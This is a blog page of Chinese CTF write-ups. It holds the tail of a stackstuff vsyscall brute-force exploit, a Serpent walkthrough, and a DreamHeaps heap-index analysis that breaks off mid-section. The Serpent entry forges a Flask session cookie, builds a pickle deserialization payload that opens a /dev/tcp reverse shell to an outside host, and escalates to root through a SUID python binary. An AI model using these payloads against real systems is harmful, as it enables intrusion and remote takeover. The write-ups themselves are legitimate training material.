remote(<span class="string">&quot;localhost&quot;</span>, <span class="number">1514</span>)</span><br><span class="line">    client.sendlineafter(<span class="string">b&#x27;Length&#x27;</span>, <span class="string">b&#x27;60&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;h&#x27;</span> * <span class="number">0x48</span> + p64(<span class="number">0xffffffffff600800</span>) * <span class="number">2</span>		<span class="comment"># padding 加上两次ret</span></span><br><span class="line">    payload += <span class="string">b&#x27;\x8b&#x27;</span> + p8(rdbyte)		<span class="comment"># 覆盖倒数两个字节</span></span><br><span class="line">    rdbyte += <span class="number">0x10</span>	<span class="comment"># 爆破</span></span><br><span class="line">    client.sendline(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;&#123;&#x27;</span> <span class="keyword">in</span> client.recvall():</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    client.close()</span><br><span class="line"><span class="comment"># flag&#123;g0ttem_b0yz&#125;</span></span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/09/03/Hacklu2015-stackstuff-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/09/02/DASCTF2023-Serpent-wp/" >羊城杯2023 Serpent-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-09-02
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1"></a>0x1</h2><p>题目提示有<code>www.zip</code> 下载得到里面的<code>app.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> secret</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/verification&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verification</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        attribute = session.get(<span class="string">&#x27;Attribute&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(attribute, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Hacker!!!&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> attribute.get(<span class="string">&#x27;name&#x27;</span>) == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> attribute.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> secret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Don&#x27;t play tricks on me&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You are a perfect stranger to me&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>明显应该是 <strong>flask session伪造</strong> ，具体可以看到<a target="_blank" rel="noopener" href="https://antel0p3.github.io/2023/08/19/LitCTF2023-flagclick-wp/">https://antel0p3.github.io/2023/08/19/LitCTF2023-flagclick-wp/</a></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cookie 中得到session</span></span><br><span class="line">$ python3 flask_session_cookie_manager.py decode -c <span class="string">&quot;eyJBdHRyaWJ1dGUiOnsiYWRtaW4iOjAsIm5hbWUiOiJHV0hUIiwic2VjcmV0X2tleSI6IkdXSFRuNGhlaWp0RVRUIn19.ZPM8vQ.BukMzKlq_IzarfBPlj81mXkRZQc&quot;</span></span><br><span class="line"><span class="comment"># &#123;&quot;Attribute&quot;:&#123;&quot;admin&quot;:0,&quot;name&quot;:&quot;GWHT&quot;,&quot;secret_key&quot;:&quot;GWHTn4heijtETT&quot;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line">$ python3 flask_session_cookie_manager.py encode -s <span class="string">&quot;GWHTn4heijtETT&quot;</span> -t <span class="string">&#x27;&#123;&quot;Attribute&quot;:&#123;&quot;admin&quot;:1,&quot;name&quot;:&quot;admin&quot;,&quot;secret_key&quot;:&quot;GWHTn4heijtETT&quot;&#125;&#125;&#x27;</span></span><br><span class="line"><span class="comment"># eyJBdHRyaWJ1dGUiOnsiYWRtaW4iOjEsIm5hbWUiOiJhZG1pbiIsInNlY3JldF9rZXkiOiJHV0hUbjRoZWlqdEVUVCJ9fQ.ZPM9Yw.CSad0BXG0k7E6ds_Om4lYMcXIto</span></span><br></pre></td></tr></table></figure>

<p>更改cookie后再次访问<code>/verification</code>可以看到</p>
<p><code>Hello admin, welcome to /ppppppppppick1e</code></p>
<h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h2><p>访问 &#x2F;ppppppppppick1e 看到<code>Hello, admin </code> 其他啥也没有</p>
<p>查看网络包头发现有<code>Hint:Source in /src0de</code></p>
<h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3"></a>0x3</h2><p>访问 &#x2F;src0de 得到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/src0de&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">src0de</span>():</span><br><span class="line">    f = <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    rsp = f.read()</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">return</span> rsp[rsp.index(<span class="string">&quot;@app.route(&#x27;/src0de&#x27;)&quot;</span>):]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@ app.route(<span class="params"><span class="string">&#x27;/ppppppppppick1e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ppppppppppick1e</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username = <span class="string">&quot;admin&quot;</span></span><br><span class="line">        rsp = make_response(<span class="string">&quot;Hello, %s &quot;</span> % username)</span><br><span class="line">        rsp.headers[<span class="string">&#x27;hint&#x27;</span>] = <span class="string">&quot;Source in /src0de&quot;</span></span><br><span class="line">        pick1e = request.cookies.get(<span class="string">&#x27;pick1e&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> pick1e <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            pick1e = base64.b64decode(pick1e)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> rsp</span><br><span class="line">        <span class="keyword">if</span> check(pick1e):</span><br><span class="line">            pick1e = pickle.loads(pick1e)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Go for it!!!&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;No Way!!!&quot;</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        error_message = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="keyword">return</span> error_message</span><br><span class="line">    <span class="keyword">return</span> rsp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GWHT</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">        app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<p>明显<code>21#pickle.loads</code>存在  <strong>pickle 反序列化漏洞</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">poc = <span class="string">b&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/8888 0&gt;&amp;1&quot;&#x27;		# 这里需要一个自己的vps公网ip</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pickletools.dis(poc)</span><br><span class="line"><span class="built_in">print</span>(poc)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(poc))</span><br><span class="line"><span class="comment"># KGNvcwpzeXN0ZW0KUydiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzQ3LjEwOS4zNi4yNi84ODg4IDA+JjEiJwpvLg==</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>具体参考</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/361349643">https://zhuanlan.zhihu.com/p/361349643</a>           <a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/89132768">https://zhuanlan.zhihu.com/p/89132768</a></p>
</blockquote>
<p>用cookie editor 加上 <code>pick1e=KGNvcw...</code>后刷新可以得到反弹shell</p>
<h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4"></a>0x4</h2><p>发现根目录下有flag  但是需要root权限读取  开始提权</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/python3.8</span><br></pre></td></tr></table></figure>

<p>可以看到 <strong>python3.8</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python3.8 -c <span class="string">&#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;</span>	<span class="comment"># 执行完后没有回显  直接输指令就好</span></span><br><span class="line">$ <span class="built_in">cat</span> /flag		</span><br></pre></td></tr></table></figure>


	
	</div>
  <a type="button" href="/2023/09/02/DASCTF2023-Serpent-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2023/08/31/SwampCTF2019-DreamHeaps-wp/" >nightmare 4.4.SwampCTF2019-DreamHeaps-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2023-08-31
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<p><a target="_blank" rel="noopener" href="https://github.com/guyinatuxedo/nightmare/tree/master/modules/11-index/swampctf19_dreamheaps">相关资源</a>  </p>
<h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ checksec dream_heaps </span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x3fe000)</span><br><span class="line">$ ./dream_heaps </span><br><span class="line">Online dream catcher! Write dreams down and come back to them later!</span><br><span class="line"></span><br><span class="line">What would you like to <span class="keyword">do</span>?</span><br><span class="line">1: Write dream</span><br><span class="line">2: Read dream</span><br><span class="line">3: Edit dream</span><br><span class="line">4: Delete dream</span><br><span class="line">5: Quit</span><br></pre></td></tr></table></figure>

<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>菜单题，主要就4个功能</p>
<h3 id="0x1-new"><a href="#0x1-new" class="headerlink" title="0x1 new"></a>0x1 new</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">new_dream</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;How long is your dream?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(v1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What are the contents of this dream?&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, v1);</span><br><span class="line">  HEAP_PTRS[INDEX] = (__int64)buf;</span><br><span class="line">  SIZES[INDEX++] = v1;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以追踪到bss段<code>INDEX, HEAP_PTRS, SIZES</code>的分布；发现HEAP_PTRS相当于长度为8的指针数组，SIZES也是长度为8的int数组</p>
<p>但是新增heap<strong>没有检测INDEX是否超出7</strong>，所以这里可以覆盖SIZES</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.bss:000000000060208C                               public INDEX</span><br><span class="line">.bss:000000000060208C ?? ?? ?? ??                   INDEX dd ?                              ; DATA XREF: new_dream+70↑r</span><br><span class="line">.bss:000000000060208C                                                                       ; new_dream+84↑r</span><br><span class="line">.bss:000000000060208C                                                                       ; new_dream+96↑r</span><br><span class="line">.bss:000000000060208C                                                                       ; new_dream+9F↑w</span><br><span class="line">.bss:000000000060208C                                                                       ; read_dream+41↑r</span><br><span class="line">.bss:000000000060208C                                                                       ; edit_dream+41↑r</span><br><span class="line">.bss:000000000060208C                                                                       ; delete_dream+41↑r</span><br><span class="line">.bss:0000000000602090 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+align 20h</span><br><span class="line">.bss:00000000006020A0                               public HEAP_PTRS</span><br><span class="line">.bss:00000000006020A0                               ; __int64 HEAP_PTRS[8]</span><br><span class="line">.bss:00000000006020A0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+HEAP_PTRS dq 8 dup(?)                             ; 0</span><br><span class="line">.bss:00000000006020A0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+                                        ; DATA XREF: new_dream+7C↑w</span><br><span class="line">.bss:00000000006020A0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+                                        ; read_dream+5C↑r</span><br><span class="line">.bss:00000000006020A0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+                                        ; edit_dream+5C↑r</span><br><span class="line">.bss:00000000006020A0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+                                        ; delete_dream+5C↑r</span><br><span class="line">.bss:00000000006020A0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+                                        ; delete_dream+79↑w</span><br><span class="line">.bss:00000000006020E0                               public SIZES</span><br><span class="line">.bss:00000000006020E0                               ; int SIZES[]</span><br><span class="line">.bss:00000000006020E0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+SIZES dd 8 dup(?)                             ; 0</span><br><span class="line">.bss:00000000006020E0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+                                        ; DATA XREF: new_dream+8F↑w</span><br><span class="line">.bss:00000000006020E0 ?? ?? ?? ?? ?? ?? ?? ?? ?? ??+ </span><br></pre></td></tr></table></figure>

<h3 id="0x2-read"><a href="#0x2-read" class="headerlink" title="0x2 read"></a>0x2 read</h3><p>读入下标输出对应内容，注意只检测了v1不超过INDEX但是没有检查是否小于0，因此<strong>可以写入负数</strong>实现多地址内容读取从而泄露libc基地址</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">read_dream</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which dream would you like to read?&quot;</span>);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= INDEX ) &#123;</span><br><span class="line">    v2 = (<span class="type">const</span> <span class="type">char</span> *)HEAP_PTRS[v1];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Hmm you skipped a few nights...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x3-edit"><a href="#0x3-edit" class="headerlink" title="0x3 edit"></a>0x3 edit</h3><p>从HEAP_PTRS和SIZES分别取指针和大小，然后对应更改，同样也是存在未检测下标为负的情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_dream</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> v1;              <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">    <span class="type">int</span> v2;              <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">    <span class="type">void</span> *buf;           <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Which dream would you like to change?&quot;</span>);</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> (v1 &lt;= INDEX) &#123;</span><br><span class="line">        buf = (<span class="type">void</span> *)HEAP_PTRS[v1];</span><br><span class="line">        v2 = SIZES[v1];</span><br><span class="line">        read(<span class="number">0</span>, buf, v2);</span><br><span class="line">        *((_BYTE *)buf + v2) = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You haven&#x27;t had this dream yet...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x4-delete"><a href="#0x4-delete" class="headerlink" title="0x4 delete"></a>0x4 delete</h3><p>free完指针置为0  没有Use after free</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_dream</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> v1;              <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">    <span class="type">void</span> *ptr;           <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">    <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">    v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Which dream would you like to delete?&quot;</span>);</span><br><span class="line">    v1 = <span class="number">0</span>;</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">    <span class="keyword">if</span> (v1 &lt;= INDEX) &#123;</span><br><span class="line">        ptr = (<span class="type">void</span> *)HEAP_PTRS[v1];</span><br><span class="line">        <span class="built_in">free</span>(ptr);</span><br><span class="line">        HEAP_PTRS[v1] = <span class="number">0LL</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Nope, you can&#x27;t delete the future.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h2><h3 id="0x1-泄露libc基地址"><a href="#0x1-泄露libc基地址" class="headerlink" title="0x1 泄露libc基地址"></a>0x1 泄露libc基地址</h3><p>我们知道可以通过read_dream结合负偏移量打印任意地址里的内容，但具体打印什么地址的内容呢？最好是got表中的地址，这样printf(“%s”)就会输出某个函数真实地址</p>
<p>这里我们通过gdb中的<code>search-pattern 0x00000</code>尝试查找<code>0x602020 (put@got)</code> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">gef➤  search-pattern 0x602020</span><br><span class="line">[+] Searching &#x27;\x20\x20\x60&#x27; in memory</span><br><span class="line">[+] In &#x27;nightmare/11-index/swampctf19_dreamheaps/dream_heaps&#x27;(0x400000-0x401000), permission=r-x</span><br><span class="line">  0x400538 - 0x40053c  →   &quot;\x20\x20\x60[...]&quot; </span><br><span class="line">gef➤  x/10gx 0x400538</span><br><span class="line">0x400538:	0x0000000000602020	0x0000000200000007</span><br><span class="line">0x400548:	0x0000000000000000	0x0000000000602028</span><br><span class="line">0x400558:	0x0000000300000007	0x0000000000000000</span><br><span class="line">0x400568:	0x0000000000602030	0x0000000400000007</span><br><span class="line">0x400578:	0x0000000000000000	0x0000000000602038</span><br></pre></td></tr></table></figure>

<p>发现<code>0x400538</code>刚好有，那么我们应该从<code>HEAP_PTRS(0x6020a0)</code>偏移到这个位置       </p>
<p> <code>(0x6020a0-0x400538) // 8 == 263021</code> 由此当我们输入下标为<code>-263021</code>时即可输出puts的真实地址</p>
<h3 id="0x2-改写got表"><a href="#0x2-改写got表" class="headerlink" title="0x2 改写got表"></a>0x2 改写got表</h3><p>改写比较好的选择就是free的真实地址，只在delete的时候被用到，只要堆的内容是&#x2F;bin&#x2F;sh改写成system真实地址之后就可以直接执行</p>
<h4 id="尝试一"><a href="#尝试一" class="headerlink" title="尝试一"></a>尝试一</h4><p>通过和0x1中同样方法可以知道下标-263024能拿到free@got的地址，首先就想着能不能通过edt直接改，但是edt还要拿一个size，由于HEAP_PTRS和SIZES相差8个qword即64个字节，偏移之后同样也是差64个字节，可以看到size为0，所以写不了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  search-pattern 0x602020</span><br><span class="line">0x400520 - 0x40052c</span><br><span class="line">gef➤  x/10gx 0x400520</span><br><span class="line">0x400520:	[HEAP_PTRS-263024]➤	0x0000000000602018 	0x0000000100000007</span><br><span class="line">0x400530:	0x0000000000000000	0x0000000000602020</span><br><span class="line">0x400540:	0x0000000200000007	0x0000000000000000</span><br><span class="line">0x400550:	0x0000000000602028	0x0000000300000007</span><br><span class="line">0x400560:	[SIZES-263024]➤	0x0000000000000000	0x0000000000602030</span><br><span class="line">0x400570:	0x0000000400000007	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>因为new_dream创建超过8后就会覆盖SIZES数组，因此SIZES内容可控，同时也可以作为HEAP_PTRS中的指针；因此可以写入free@got 0x602018，经尝试后写入SIZES[18]即为HEAP_PTRS[17]，对应大小即SIZES[17]   理想情况即为：</p>
